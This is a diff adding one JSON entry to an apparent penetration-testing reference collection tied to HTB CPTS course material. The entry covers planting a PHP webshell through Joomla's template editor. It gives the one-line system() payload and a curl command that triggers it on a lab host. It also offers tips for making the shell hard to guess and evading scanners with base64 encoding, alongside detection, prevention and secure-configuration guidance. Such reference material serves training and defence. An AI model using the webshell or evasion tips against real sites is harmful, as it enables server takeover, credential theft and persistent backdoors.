@@ -1,0 +1,88 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "joomla",
+    "curl"
+  ],
+  "tags": [
+    "joomla",
+    "webshell",
+    "rce"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Joomla",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Edit a template PHP file (error.php) via the Templates panel",
+      "command": "# via /administrator/index.php?option=com_templates -> edit error.php"
+    },
+    {
+      "label": "Trigger the webshell with a command",
+      "command": "curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
+    }
+  ],
+  "notes": "Templates > Customise only exposes editable files for the active template - switch the active template if error.php isn't writable. Use a random GET-parameter name so the shell isn't trivially guessable.",
+  "references": [
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "joomla-bruteforce",
+      "note": "Provides the admin login needed to edit a template.",
+      "rel": "prereq"
+    },
+    {
+      "id": "reverse-shell-oneliners",
+      "note": "Upgrade the webshell to a reverse shell.",
+      "rel": "escalation"
+    }
+  ],
+  "id": "joomla-template-webshell",
+  "name": "Joomla - Template Editor Webshell (RCE)",
+  "command": "system($_GET['<rand>']);",
+  "description": "With admin access, edit a template PHP file (e.g. error.php) via Templates > Customise to add a system() call, then invoke it for command execution.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1505.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Joomla's template manager lets admin users edit PHP template files directly. Inserting system($_GET['cmd']); into error.php creates a webshell at the template's URL, executed by PHP on every request.",
+    "prerequisites": "Valid Joomla admin credentials. Template editing not disabled. Write permission for www-data on template files.",
+    "impact": "RCE as www-data. Full server access, database credential theft from configuration.php, and persistent backdoor.",
+    "detection": "Joomla audit log showing template file modification. File integrity alert on template PHP files. Web server log showing GET to template error.php with cmd parameter.",
+    "artifacts": "Joomla audit log (template file edit) | File system change: modified .php in /templates/ | Access log (GET /templates/protostar/error.php?<hash>=id)",
+    "prevention": "Restrict template editing via Joomla Global Config. Use filesystem restrictions so www-data cannot write template directories. Deploy file integrity monitoring.",
+    "misconfiguration": "Joomla template editor enabled. www-data has write access to /var/www/html/templates/. No file-change alerting.",
+    "vulnerable_config": "# Joomla -- template editing enabled by default\n# /administrator/index.php?option=com_templates\n# Templates editor: enabled for Super Users\n\n# Filesystem -- /templates/ writable by web server\nls -la /var/www/html/templates/\n# drwxrwxr-x www-data www-data templates/  <-- writable\n\n# Any Super User can edit template PHP files directly",
+    "secure_config": "# Joomla -- disable template file editing\n# Global Configuration > System > Frontend Template Editing: No\n# Global Configuration > System > Backend Template Editing: No\n\n# Filesystem -- make templates read-only for web server\nchown -R root:www-data /var/www/html/templates/\nchmod -R 750 /var/www/html/templates/\nfind /var/www/html/templates/ -name '*.php' -exec chmod 640 {} \\;\n\n# PHP -- disable file write functions in php.ini\ndisable_functions = exec,passthru,shell_exec,system,file_put_contents,fwrite",
+    "evasion": "Edit a less-visited template file. Encode the PHP webshell with base64_decode to evade content scanners.",
+    "sources": [
+      "HTB M24",
+      "MITRE T1505.003",
+      "OWASP A04:2021"
+    ]
+  }
+}
